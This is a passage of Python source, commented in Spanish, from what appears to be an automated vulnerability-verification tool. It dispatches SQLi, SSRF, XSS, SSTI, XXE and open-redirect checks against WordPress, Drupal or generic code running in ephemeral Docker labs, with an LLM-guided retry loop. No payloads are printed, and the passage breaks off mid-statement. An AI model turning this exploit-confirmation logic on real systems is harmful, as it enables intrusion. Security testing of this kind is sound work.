                # real (cuerpo de la respuesta de control) que un analista humano leeria a mano --
                # igual que se hizo en vivo con CVE-2024-3552 -- y, solo si ve una pista concreta,
                # se reintenta con el endpoint/parametro que sugiera. Bucle ACOTADO (como mucho
                # _SQLI_RETRY_MAX_ATTEMPTS intentos en total, no infinito): cada iteracion para en
                # cuanto se confirma, o en cuanto el LLM deja de ver ninguna pista nueva en la
                # evidencia del ultimo intento -- nunca un reintento a ciegas sin base real.
                # si "Wrong Nonce"/similar persiste a pesar de que verify_wordpress_sqli YA
                # rasca el nonce de TODAS las paginas publicadas del sitio (ver wpverify.py,
                # _list_real_page_urls), es que esta en una pagina que esa enumeracion no cubrio
                # -- se le da al LLM la oportunidad de señalar una pagina CONCRETA (por el
                # README/nombre del PoC publico, nunca inventada) para que se pruebe tambien en
                # el siguiente intento, en vez de rendirse solo porque el scraping determinista
                # no la encontro.
                # igual que arriba, pero para cuando el sintoma es "el plugin no muestra NADA de
                # si mismo en ninguna pagina" (ver 'nonce_scraping_diagnostico' en la evidencia) --
                # el LLM puede reconocer que ESTE plugin exige un paso de configuracion propio
                # (confirmado en vivo, Ultimate Member/CVE-2024-1071) y señalar la URL de admin
                # que lo dispara, sin que binoracle tenga que conocer ya ese plugin de antemano.
                extra_nonce_pages: List[str] = []
                extra_setup_trigger_paths: List[str] = []
                def _on_sqli_suggestion(sug):
                    _apply_generic_wp_suggestion(sug, extra_nonce_pages,
                                                 extra_setup_trigger_paths, params)
                def _attempt_sqli(ep, pr):
                    _ep_method = ("POST" if "admin-ajax" in (ep or "")
                                  else notes.get("http_method") or "GET")
                    return verify_wordpress_sqli(
                        fr.local_path, plugin_dir, ep, _ep_method, params,
                        sqli_param_hint=pr or "", on_step=step, budget_s=budget_s,
                        setup_wp_options=notes.get("setup_options") or [],
                        companion_plugins=companion_plugins, shortcode_name=shortcode_name,
                        relationship_table=relationship_table,
                        extra_nonce_pages=list(extra_nonce_pages),
                        extra_setup_trigger_paths=list(extra_setup_trigger_paths))
                wr = _retry_or_keep_lab_alive(
                    keep_lab_on_failure, step, es, wr, lambda: _run_evidence_retry_loop(
                        llm, step, es, _SQLI_RETRY_SYS, _SQLI_RETRY_EVIDENCE_KEYS, _attempt_sqli,
                        wr, notes.get("endpoint"), sqli_p, technique_label="SQLi WordPress",
                        max_attempts=_SQLI_RETRY_MAX_ATTEMPTS, on_suggestion=_on_sqli_suggestion))
                inv.dynamic_verify = {"attempted": True, "available": wr.available,
                                      "ok": wr.ok, "verified": wr.verified, "detail": wr.detail,
                                      "logs": wr.logs}
                inv.attempt_evidence = wr.evidence
                if wr.verified:
                    inv.verified = True
                    inv.verified_detail = wr.detail
                    inv.verified_evidence = wr.evidence
                elif not wr.available:
                    inv.blockers.append(("verificacion dinamica no intentada: " + wr.limitations[0]
                                         if wr.limitations else
                                         "verificacion dinamica no disponible (sin Docker)"))
                else:
                    inv.blockers.append((f"verificacion dinamica intentada pero no confirmada: "
                                         f"{wr.detail}" if es else
                                         f"dynamic verification attempted but not confirmed: "
                                         f"{wr.detail}"))
                    for entry in wr.logs:
                        if entry.startswith("docker logs"):
                            head, _, body = entry.partition("\n")
                            trimmed = "\n".join(body.splitlines()[-15:])
                            inv.blockers.append(f"{head}:\n```\n{trimmed}\n```")
            # "cualquier entorno": fallback generico de SQLi (ver genericverify.py) para cuando el
            # codigo descargado no es un CMS reconocido. Solo cubre la variante ciega por tiempo
            # (SLEEP/pg_sleep) -- sin saber el motor real, error-based/UNION-based (sintaxis de
            # MySQL en los verificadores CMS-especificos) no generalizan sin arriesgar falsos
            # positivos/negativos.
            elif (not plugin_dir and fr.local_path and
                  inv.vuln_class in ("sqli", "sql-injection") and notes.get("endpoint")):
                from .genericverify import verify_generic_sqli_blind, _pick_param
                from .wpverify import _SQLI_HINTS
                params = notes.get("parameters") or []
                sqli_p = notes.get("sqli_param") or _pick_param(params, _SQLI_HINTS)
                step(("intentando verificacion DINAMICA GENERICA -- ciega por tiempo (SLEEP/"
                     "pg_sleep), el objetivo se construye desde su propio Dockerfile/compose..."
                     if es else "attempting GENERIC DYNAMIC verification -- time-based blind "
                     "(SLEEP/pg_sleep), the target is built from its own Dockerfile/compose..."))
                id_table_hint = notes.get("sqli_identifier_table_hint", "")
                # Cuando el lab fue scaffoldeado por nosotros (local-dir), el endpoint y el
                # parametro son FIJOS (los que el lab realmente expone).  El retry del LLM
                # suele sugerir endpoints CMS (admin-ajax.php, etc.) que no existen en el lab
                # y producen 404 en ambos payloads bool → diff=0 → never confirmed.
                # Capturamos el endpoint/param del lab antes del retry y los forzamos en el
                # callback para que el LLM no los sobreescriba.
                _genlab_ep    = notes.get("endpoint")
                _genlab_param = sqli_p or ""
                _is_local_lab = (fr.kind == "local-dir")
                wr = verify_generic_sqli_blind(
                    fr.local_path, _genlab_ep, notes.get("http_method") or "GET",
                    params, sqli_param_hint=_genlab_param, on_step=step, budget_s=budget_s,
                    sqli_identifier_table_hint=id_table_hint)
                def _attempt_sqli_blind_generic(ep, pr):
                    _ep  = _genlab_ep    if _is_local_lab else ep
                    _pr  = _genlab_param if _is_local_lab else pr
                    return verify_generic_sqli_blind(
                        fr.local_path, _ep, notes.get("http_method") or "GET", params,
                        sqli_param_hint=_pr or "", on_step=step, budget_s=budget_s,
                        sqli_identifier_table_hint=id_table_hint)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _SQLI_RETRY_SYS, _SQLI_RETRY_EVIDENCE_KEYS,
                    _attempt_sqli_blind_generic, wr, _genlab_ep, _genlab_param,
                    technique_label="SQLi ciega por tiempo (generico)",
                    max_attempts=_SQLI_RETRY_MAX_ATTEMPTS)
                _apply_wpverify_result(inv, wr, es, llm)
            # mismo laboratorio efimero, para SSRF: un listener interno (en la misma red Docker,
            # no expuesto) registra si el SERVIDOR hace de verdad la peticion saliente -- ver
            # verify_wordpress_ssrf. Drupal primero (sexta clase, "poco a poco"), WordPress gated
            # por 'not is_drupal' justo despues, mismo patron que el resto del dispatch.
            elif (is_drupal and fr.kind in ("drupal-module", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "ssrf" and notes.get("endpoint")):
                from .drupalverify import verify_drupal_ssrf, _pick_param
                from .wpverify import _URL_HINTS
                params = notes.get("parameters") or []
                url_p = notes.get("url_param") or _pick_param(params, _URL_HINTS)
                step(("intentando verificacion DINAMICA -- listener interno con token aleatorio "
                     "(Drupal+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- internal listener with a random token "
                     "(ephemeral Drupal+MySQL in Docker)..."))
                wr = verify_drupal_ssrf(fr.local_path, plugin_dir, notes.get("endpoint"),
                                        notes.get("http_method") or "GET", params,
                                        url_param_hint=url_p or "", on_step=step, budget_s=budget_s)
                def _attempt_ssrf_drupal(ep, pr):
                    return verify_drupal_ssrf(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        url_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_RETRY_SYS, _RESPUESTA_MUESTRA_EVIDENCE_KEYS,
                    _attempt_ssrf_drupal, wr, notes.get("endpoint"), url_p,
                    technique_label="SSRF Drupal")
                _apply_wpverify_result(inv, wr, es, llm)
            elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "ssrf" and notes.get("endpoint")):
                from .wpverify import verify_wordpress_ssrf, _pick_param, _URL_HINTS
                params = notes.get("parameters") or []
                url_p = notes.get("url_param") or _pick_param(params, _URL_HINTS)
                step(("intentando verificacion DINAMICA -- listener interno con token aleatorio "
                     "(WordPress+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- internal listener with a random token "
                     "(ephemeral WordPress+MySQL in Docker)..."))
                wr = verify_wordpress_ssrf(
                    fr.local_path, plugin_dir, notes.get("endpoint"),
                    notes.get("http_method") or "GET", params,
                    url_param_hint=url_p or "", on_step=step, budget_s=budget_s,
                    companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                    keep_lab_on_failure=keep_lab_on_failure)
                ssrf_wp_extra_nonce_pages: List[str] = []
                ssrf_wp_extra_setup_trigger_paths: List[str] = []
                def _on_ssrf_wp_suggestion(sug):
                    _apply_generic_wp_suggestion(sug, ssrf_wp_extra_nonce_pages,
                                                 ssrf_wp_extra_setup_trigger_paths, params)
                def _attempt_ssrf_wp(ep, pr):
                    return verify_wordpress_ssrf(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        url_param_hint=pr or "", on_step=step, budget_s=budget_s,
                        companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                        keep_lab_on_failure=keep_lab_on_failure,
                        extra_nonce_pages=list(ssrf_wp_extra_nonce_pages),
                        extra_setup_trigger_paths=list(ssrf_wp_extra_setup_trigger_paths))
                wr = _retry_or_keep_lab_alive(
                    keep_lab_on_failure, step, es, wr, lambda: _run_evidence_retry_loop(
                        llm, step, es, _WP_GENERIC_RETRY_SYS, _WP_GENERIC_RETRY_EVIDENCE_KEYS,
                        _attempt_ssrf_wp, wr, notes.get("endpoint"), url_p,
                        technique_label="SSRF WordPress", on_suggestion=_on_ssrf_wp_suggestion))
                inv.dynamic_verify = {"attempted": True, "available": wr.available,
                                      "ok": wr.ok, "verified": wr.verified, "detail": wr.detail,
                                      "logs": wr.logs}
                inv.attempt_evidence = wr.evidence
                if wr.verified:
                    inv.verified = True
                    inv.verified_detail = wr.detail
                    inv.verified_evidence = wr.evidence
                elif not wr.available:
                    inv.blockers.append(("verificacion dinamica no intentada: " + wr.limitations[0]
                                         if wr.limitations else
                                         "verificacion dinamica no disponible (sin Docker)"))
                else:
                    inv.blockers.append((f"verificacion dinamica intentada pero no confirmada: "
                                         f"{wr.detail}" if es else
                                         f"dynamic verification attempted but not confirmed: "
                                         f"{wr.detail}"))
                    for entry in wr.logs:
                        if entry.startswith("docker logs"):
                            head, _, body = entry.partition("\n")
                            trimmed = "\n".join(body.splitlines()[-15:])
                            inv.blockers.append(f"{head}:\n```\n{trimmed}\n```")
            # "cualquier entorno": fallback generico de SSRF (ver genericverify.py) para cuando el
            # codigo descargado no es un CMS reconocido pero trae su propio Dockerfile/
            # docker-compose.yml.
            elif (not plugin_dir and fr.local_path and
                  inv.vuln_class == "ssrf" and notes.get("endpoint")):
                from .genericverify import verify_generic_ssrf, _pick_param
                from .wpverify import _URL_HINTS
                params = notes.get("parameters") or []
                url_p = notes.get("url_param") or _pick_param(params, _URL_HINTS)
                step(("intentando verificacion DINAMICA GENERICA -- listener interno con token "
                     "aleatorio, el objetivo se construye desde su propio Dockerfile/compose..."
                     if es else "attempting GENERIC DYNAMIC verification -- internal listener "
                     "with a random token, the target is built from its own Dockerfile/"
                     "compose..."))
                wr = verify_generic_ssrf(
                    fr.local_path, notes.get("endpoint"), notes.get("http_method") or "GET",
                    params, url_param_hint=url_p or "", on_step=step, budget_s=budget_s)
                def _attempt_ssrf_generic(ep, pr):
                    return verify_generic_ssrf(
                        fr.local_path, ep, notes.get("http_method") or "GET", params,
                        url_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_RETRY_SYS, _RESPUESTA_CUERPO_EVIDENCE_KEYS,
                    _attempt_ssrf_generic, wr, notes.get("endpoint"), url_p,
                    technique_label="SSRF generico")
                _apply_wpverify_result(inv, wr, es, llm)
            # mismo laboratorio efimero, para XSS/SSTI/XXE/open-redirect/file-upload/CSRF -- ver
            # _apply_wpverify_result() mas abajo, que vuelca el resultado en inv/blockers igual que
            # los bloques anteriores (evita repetir el mismo volcado 6 veces mas). Cada clase trae
            # su propio par Drupal/WordPress, mismo patron 'is_drupal'/'not is_drupal'.
            elif (is_drupal and fr.kind in ("drupal-module", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "xss" and notes.get("endpoint")):
                from .drupalverify import verify_drupal_xss, _pick_param
                from .wpverify import _XSS_HINTS
                params = notes.get("parameters") or []
                xss_p = notes.get("xss_param") or _pick_param(params, _XSS_HINTS)
                step(("intentando verificacion DINAMICA -- ejecucion real en navegador headless "
                     "(Drupal+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- real headless-browser execution "
                     "(ephemeral Drupal+MySQL in Docker)..."))
                wr = verify_drupal_xss(fr.local_path, plugin_dir, notes.get("endpoint"),
                                       notes.get("http_method") or "GET", params,
                                       xss_param_hint=xss_p or "", on_step=step, budget_s=budget_s)
                def _attempt_xss_drupal(ep, pr):
                    return verify_drupal_xss(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        xss_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_RETRY_SYS, _RESPUESTA_CUERPO_EVIDENCE_KEYS,
                    _attempt_xss_drupal, wr, notes.get("endpoint"), xss_p,
                    technique_label="XSS Drupal")
                _apply_wpverify_result(inv, wr, es, llm)
            elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "xss" and notes.get("endpoint")):
                from .wpverify import verify_wordpress_xss, _pick_param, _XSS_HINTS
                params = notes.get("parameters") or []
                xss_p = notes.get("xss_param") or _pick_param(params, _XSS_HINTS)
                step(("intentando verificacion DINAMICA -- ejecucion real en navegador headless "
                     "(WordPress+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- real headless-browser execution "
                     "(ephemeral WordPress+MySQL in Docker)..."))
                wr = verify_wordpress_xss(fr.local_path, plugin_dir, notes.get("endpoint"),
                                          notes.get("http_method") or "GET", params,
                                          xss_param_hint=xss_p or "", on_step=step, budget_s=budget_s,
                                          companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                                          keep_lab_on_failure=keep_lab_on_failure)
                xss_wp_extra_nonce_pages: List[str] = []
                xss_wp_extra_setup_trigger_paths: List[str] = []
                def _on_xss_wp_suggestion(sug):
                    _apply_generic_wp_suggestion(sug, xss_wp_extra_nonce_pages,
                                                 xss_wp_extra_setup_trigger_paths, params)
                def _attempt_xss_wp(ep, pr):
                    return verify_wordpress_xss(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        xss_param_hint=pr or "", on_step=step, budget_s=budget_s,
                        companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                        keep_lab_on_failure=keep_lab_on_failure,
                        extra_nonce_pages=list(xss_wp_extra_nonce_pages),
                        extra_setup_trigger_paths=list(xss_wp_extra_setup_trigger_paths))
                wr = _retry_or_keep_lab_alive(
                    keep_lab_on_failure, step, es, wr, lambda: _run_evidence_retry_loop(
                        llm, step, es, _WP_GENERIC_RETRY_SYS, _WP_GENERIC_RETRY_EVIDENCE_KEYS,
                        _attempt_xss_wp, wr, notes.get("endpoint"), xss_p,
                        technique_label="XSS WordPress", on_suggestion=_on_xss_wp_suggestion))
                _apply_wpverify_result(inv, wr, es, llm)
            # "cualquier entorno": fallback generico de XSS (ver genericverify.py).
            elif (not plugin_dir and fr.local_path and
                  inv.vuln_class == "xss" and notes.get("endpoint")):
                from .genericverify import verify_generic_xss, _pick_param
                from .wpverify import _XSS_HINTS
                params = notes.get("parameters") or []
                xss_p = notes.get("xss_param") or _pick_param(params, _XSS_HINTS)
                step(("intentando verificacion DINAMICA GENERICA -- ejecucion real en navegador "
                     "headless, el objetivo se construye desde su propio Dockerfile/compose..."
                     if es else "attempting GENERIC DYNAMIC verification -- real headless-"
                     "browser execution, the target is built from its own Dockerfile/compose..."))
                wr = verify_generic_xss(
                    fr.local_path, notes.get("endpoint"), notes.get("http_method") or "GET",
                    params, xss_param_hint=xss_p or "", on_step=step, budget_s=budget_s)
                def _attempt_xss_generic(ep, pr):
                    return verify_generic_xss(
                        fr.local_path, ep, notes.get("http_method") or "GET", params,
                        xss_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_RETRY_SYS, _RESPUESTA_CUERPO_EVIDENCE_KEYS,
                    _attempt_xss_generic, wr, notes.get("endpoint"), xss_p,
                    technique_label="XSS generico")
                _apply_wpverify_result(inv, wr, es, llm)
            elif (is_drupal and fr.kind in ("drupal-module", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "ssti" and notes.get("endpoint")):
                from .drupalverify import verify_drupal_ssti, _pick_param
                from .wpverify import _XSS_HINTS
                params = notes.get("parameters") or []
                ssti_p = notes.get("ssti_param") or _pick_param(params, _XSS_HINTS)
                step(("intentando verificacion DINAMICA -- aritmetica calculada por el motor de "
                     "plantillas (Drupal+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- arithmetic computed by the template "
                     "engine (ephemeral Drupal+MySQL in Docker)..."))
                wr = verify_drupal_ssti(fr.local_path, plugin_dir, notes.get("endpoint"),
                                        notes.get("http_method") or "GET", params,
                                        ssti_param_hint=ssti_p or "", on_step=step, budget_s=budget_s)
                def _attempt_ssti_drupal(ep, pr):
                    return verify_drupal_ssti(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        ssti_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_RETRY_SYS, _RESPUESTA_MUESTRA_EVIDENCE_KEYS,
                    _attempt_ssti_drupal, wr, notes.get("endpoint"), ssti_p,
                    technique_label="SSTI Drupal")
                _apply_wpverify_result(inv, wr, es, llm)
            elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "ssti" and notes.get("endpoint")):
                from .wpverify import verify_wordpress_ssti, _pick_param, _XSS_HINTS
                params = notes.get("parameters") or []
                ssti_p = notes.get("ssti_param") or _pick_param(params, _XSS_HINTS)
                step(("intentando verificacion DINAMICA -- aritmetica calculada por el motor de "
                     "plantillas (WordPress+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- arithmetic computed by the template "
                     "engine (ephemeral WordPress+MySQL in Docker)..."))
                wr = verify_wordpress_ssti(fr.local_path, plugin_dir, notes.get("endpoint"),
                                           notes.get("http_method") or "GET", params,
                                           ssti_param_hint=ssti_p or "", on_step=step, budget_s=budget_s,
                                           companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                                           keep_lab_on_failure=keep_lab_on_failure)
                ssti_wp_extra_nonce_pages: List[str] = []
                ssti_wp_extra_setup_trigger_paths: List[str] = []
                def _on_ssti_wp_suggestion(sug):
                    _apply_generic_wp_suggestion(sug, ssti_wp_extra_nonce_pages,
                                                 ssti_wp_extra_setup_trigger_paths, params)
                def _attempt_ssti_wp(ep, pr):
                    return verify_wordpress_ssti(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        ssti_param_hint=pr or "", on_step=step, budget_s=budget_s,
                        companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                        keep_lab_on_failure=keep_lab_on_failure,
                        extra_nonce_pages=list(ssti_wp_extra_nonce_pages),
                        extra_setup_trigger_paths=list(ssti_wp_extra_setup_trigger_paths))
                wr = _retry_or_keep_lab_alive(
                    keep_lab_on_failure, step, es, wr, lambda: _run_evidence_retry_loop(
                        llm, step, es, _WP_GENERIC_RETRY_SYS, _WP_GENERIC_RETRY_EVIDENCE_KEYS,
                        _attempt_ssti_wp, wr, notes.get("endpoint"), ssti_p,
                        technique_label="SSTI WordPress", on_suggestion=_on_ssti_wp_suggestion))
                _apply_wpverify_result(inv, wr, es, llm)
            # "cualquier entorno": fallback generico de SSTI (ver genericverify.py).
            # La condicion acepta source_dir aunque el LLM no haya dado endpoint: el verificador
            # escanea el codigo fuente para descubrir rutas Flask/Sinatra de forma autonoma
            # (ver _scan_web_routes en genericverify.py).
            elif (not plugin_dir and fr.local_path and inv.vuln_class == "ssti" and
                  (notes.get("endpoint") or os.path.isdir(str(fr.local_path)))):
                from .genericverify import verify_generic_ssti, _pick_param
                from .wpverify import _XSS_HINTS
                params = notes.get("parameters") or []
                ssti_p = notes.get("ssti_param") or _pick_param(params, _XSS_HINTS)
                step(("intentando verificacion DINAMICA GENERICA -- aritmetica calculada por el "
                     "motor de plantillas, el objetivo se construye desde su propio Dockerfile/"
                     "compose..." if es else "attempting GENERIC DYNAMIC verification -- "
                     "arithmetic computed by the template engine, the target is built from its "
                     "own Dockerfile/compose..."))
                wr = verify_generic_ssti(
                    fr.local_path, notes.get("endpoint"), notes.get("http_method") or "GET",
                    params, ssti_param_hint=ssti_p or "", on_step=step, budget_s=budget_s)
                def _attempt_ssti_generic(ep, pr):
                    return verify_generic_ssti(
                        fr.local_path, ep, notes.get("http_method") or "GET", params,
                        ssti_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_RETRY_SYS, _RESPUESTA_CUERPO_EVIDENCE_KEYS,
                    _attempt_ssti_generic, wr, notes.get("endpoint"), ssti_p,
                    technique_label="SSTI generico")
                _apply_wpverify_result(inv, wr, es, llm)
            elif (is_drupal and fr.kind in ("drupal-module", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "xxe" and notes.get("endpoint")):
                from .drupalverify import verify_drupal_xxe, _pick_param
                from .wpverify import _XML_HINTS
                params = notes.get("parameters") or []
                xml_p = notes.get("xml_param") or _pick_param(params, _XML_HINTS)
                step(("intentando verificacion DINAMICA -- fichero canario con secreto aleatorio "
                     "via entidad externa (Drupal+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- random-secret canary file via external "
                     "entity (ephemeral Drupal+MySQL in Docker)..."))
                wr = verify_drupal_xxe(fr.local_path, plugin_dir, notes.get("endpoint"),
                                       notes.get("http_method") or "GET", params,
                                       xml_param_hint=xml_p or "", on_step=step, budget_s=budget_s)
                def _attempt_xxe_drupal(ep, pr):
                    return verify_drupal_xxe(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        xml_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_RETRY_SYS, _RESPUESTA_MUESTRA_EVIDENCE_KEYS,
                    _attempt_xxe_drupal, wr, notes.get("endpoint"), xml_p,
                    technique_label="XXE Drupal")
                _apply_wpverify_result(inv, wr, es, llm)
            elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "xxe" and notes.get("endpoint")):
                from .wpverify import verify_wordpress_xxe, _pick_param, _XML_HINTS
                params = notes.get("parameters") or []
                xml_p = notes.get("xml_param") or _pick_param(params, _XML_HINTS)
                step(("intentando verificacion DINAMICA -- fichero canario con secreto aleatorio "
                     "via entidad externa (WordPress+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- random-secret canary file via external "
                     "entity (ephemeral WordPress+MySQL in Docker)..."))
                wr = verify_wordpress_xxe(fr.local_path, plugin_dir, notes.get("endpoint"),
                                          notes.get("http_method") or "GET", params,
                                          xml_param_hint=xml_p or "", on_step=step, budget_s=budget_s,
                                          companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                                          keep_lab_on_failure=keep_lab_on_failure)
                xxe_wp_extra_nonce_pages: List[str] = []
                xxe_wp_extra_setup_trigger_paths: List[str] = []
                def _on_xxe_wp_suggestion(sug):
                    _apply_generic_wp_suggestion(sug, xxe_wp_extra_nonce_pages,
                                                 xxe_wp_extra_setup_trigger_paths, params)
                def _attempt_xxe_wp(ep, pr):
                    return verify_wordpress_xxe(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        xml_param_hint=pr or "", on_step=step, budget_s=budget_s,
                        companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                        keep_lab_on_failure=keep_lab_on_failure,
                        extra_nonce_pages=list(xxe_wp_extra_nonce_pages),
                        extra_setup_trigger_paths=list(xxe_wp_extra_setup_trigger_paths))
                wr = _retry_or_keep_lab_alive(
                    keep_lab_on_failure, step, es, wr, lambda: _run_evidence_retry_loop(
                        llm, step, es, _WP_GENERIC_RETRY_SYS, _WP_GENERIC_RETRY_EVIDENCE_KEYS,
                        _attempt_xxe_wp, wr, notes.get("endpoint"), xml_p,
                        technique_label="XXE WordPress", on_suggestion=_on_xxe_wp_suggestion))
                _apply_wpverify_result(inv, wr, es, llm)
            # "cualquier entorno": fallback generico de XXE (ver genericverify.py) para cuando el
            # codigo descargado no es un CMS reconocido pero trae su propio Dockerfile/compose.
            elif (not plugin_dir and fr.local_path and
                  inv.vuln_class == "xxe" and notes.get("endpoint")):
                from .genericverify import verify_generic_xxe, _pick_param
                from .wpverify import _XML_HINTS
                params = notes.get("parameters") or []
                xml_p = notes.get("xml_param") or _pick_param(params, _XML_HINTS)
                step(("intentando verificacion DINAMICA GENERICA -- fichero canario via entidad "
                     "externa, el objetivo se construye desde su propio Dockerfile/compose..."
                     if es else "attempting GENERIC DYNAMIC verification -- canary file via "
                     "external entity, the target is built from its own Dockerfile/compose..."))
                wr = verify_generic_xxe(
                    fr.local_path, notes.get("endpoint"), notes.get("http_method") or "GET",
                    params, xml_param_hint=xml_p or "", on_step=step, budget_s=budget_s)
                def _attempt_xxe_generic(ep, pr):
                    return verify_generic_xxe(
                        fr.local_path, ep, notes.get("http_method") or "GET", params,
                        xml_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_RETRY_SYS, _RESPUESTA_CUERPO_EVIDENCE_KEYS,
                    _attempt_xxe_generic, wr, notes.get("endpoint"), xml_p,
                    technique_label="XXE generico")
                _apply_wpverify_result(inv, wr, es, llm)
            elif (is_drupal and fr.kind in ("drupal-module", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "open-redirect" and notes.get("endpoint")):
                from .drupalverify import verify_drupal_open_redirect, _pick_param
                from .wpverify import _REDIRECT_HINTS
                params = notes.get("parameters") or []
                redir_p = notes.get("redirect_param") or _pick_param(params, _REDIRECT_HINTS)
                step(("intentando verificacion DINAMICA -- cabecera Location real sin seguir "
                     "redirects (Drupal+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- real Location header without following "
                     "redirects (ephemeral Drupal+MySQL in Docker)..."))
                wr = verify_drupal_open_redirect(fr.local_path, plugin_dir, notes.get("endpoint"),
                                                 notes.get("http_method") or "GET", params,
                                                 redirect_param_hint=redir_p or "", on_step=step, budget_s=budget_s)
                def _attempt_or_drupal(ep, pr):
                    return verify_drupal_open_redirect(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        redirect_param_hint=pr or "", on_step=step, budget_s=budget_s)
                wr = _run_evidence_retry_loop(
                    llm, step, es, _GENERIC_RETRY_SYS, _RESPUESTA_CUERPO_EVIDENCE_KEYS,
                    _attempt_or_drupal, wr, notes.get("endpoint"), redir_p,
                    technique_label="open redirect Drupal")
                _apply_wpverify_result(inv, wr, es, llm)
            elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                  and inv.vuln_class == "open-redirect" and notes.get("endpoint")):
                from .wpverify import verify_wordpress_open_redirect, _pick_param, _REDIRECT_HINTS
                params = notes.get("parameters") or []
                redir_p = notes.get("redirect_param") or _pick_param(params, _REDIRECT_HINTS)
                step(("intentando verificacion DINAMICA -- cabecera Location real sin seguir "
                     "redirects (WordPress+MySQL efimero en Docker)..." if es else
                     "attempting DYNAMIC verification -- real Location header without following "
                     "redirects (ephemeral WordPress+MySQL in Docker)..."))
                wr = verify_wordpress_open_redirect(fr.local_path, plugin_dir, notes.get("endpoint"),
                                                    notes.get("http_method") or "GET", params,
                                                    redirect_param_hint=redir_p or "", on_step=step, budget_s=budget_s,
                                                    companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                                                    keep_lab_on_failure=keep_lab_on_failure)
                or_wp_extra_nonce_pages: List[str] = []
                or_wp_extra_setup_trigger_paths: List[str] = []
                def _on_or_wp_suggestion(sug):
                    _apply_generic_wp_suggestion(sug, or_wp_extra_nonce_pages,
                                                 or_wp_extra_setup_trigger_paths, params)
                def _attempt_or_wp(ep, pr):
                    return verify_wordpress_open_redirect(
                        fr.local_path, plugin_dir, ep, notes.get("http_method") or "GET", params,
                        redirect_param_hint=pr or "", on_step=step, budget_s=budget_s,
                        companion_plugins=companion_plugins, shortcode_name=shortcode_name_generic,
                        keep_lab_on_failure=keep_lab_on_failure,
                        extra_nonce_pages=list(or_wp_extra_nonce_pages),
                        extra_setup_trigger_paths=list(or_wp_extra_setup_trigger_paths))
                wr = _retry_or_keep_lab_alive(
                    keep_lab_on_failure, step, es, wr, lambda: _run_evidence_retry_loop(
                        llm, step, es, _WP_GENERIC_RETRY_SYS, _WP_GENERIC_RETRY_EVIDENCE_KEYS,
                        _attempt_or_wp, wr, notes.get("endpoint"), redir_p,
                        technique_label="open redirect WordPress", on_suggestion=_on_or_wp_suggestion))
                _apply_wpverify_result(inv, wr, es, llm)
            # "cualquier entorno": fallback generico de open-redirect (ver genericverify.py).
            elif (not plugin_dir and fr.local_path and
                  inv.vuln_class == "open-redirect" and notes.get("endpoint")):
                from .genericverify import verify_generic_open_redirect, _pick_param
                from .wpverify import _REDIRECT_HINTS
                params = notes.get("parameters") or []
                redir_p = notes.get("redirect_param") or _pick_param(params, _REDIRECT_HINTS)
                step(("intentando verificacion DINAMICA GENERICA -- cabecera Location real sin "
                     "seguir redirects, el objetivo se construye desde su propio Dockerfile/"
                     "compose..." if es else "attempting GENERIC DYNAMIC verification -- real "
                     "Location header without following redirects, the target is built from its "
